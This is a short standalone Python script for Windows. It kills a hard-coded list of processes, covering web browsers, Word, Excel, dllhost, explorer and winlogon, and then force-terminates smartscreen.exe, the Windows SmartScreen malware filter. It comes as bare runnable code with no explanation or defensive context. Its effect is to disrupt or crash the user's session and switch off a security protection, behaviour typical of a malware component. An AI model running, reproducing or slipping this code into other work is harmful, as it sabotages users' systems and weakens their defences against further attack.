#!/usr/bin/python
#coding:utf-8
import os, sys
# Function to kill a process with listing process
def pkill(process_name):
    try:
        killed = os.system('tskill ' + process_name)
    except Exception:
        killed = 0
    return killed
# List of process
prg = ['iexplore', 'chrome', 'firefox', 'winword', 'excel', 'dllhost', 'explorer', 'winlogon']
try:
    for proc in prg:
        pkill(proc)
except Exception:
    print("Error proc not found")

# Function to kill a process with force option (this function used in the main program)
def pkill_smart():
    try:
        killed = "taskkill /IM smartscreen.exe /F"
        os.system(killed)
    except Exception:
        killed = 0
    return killed
pkill_smart()
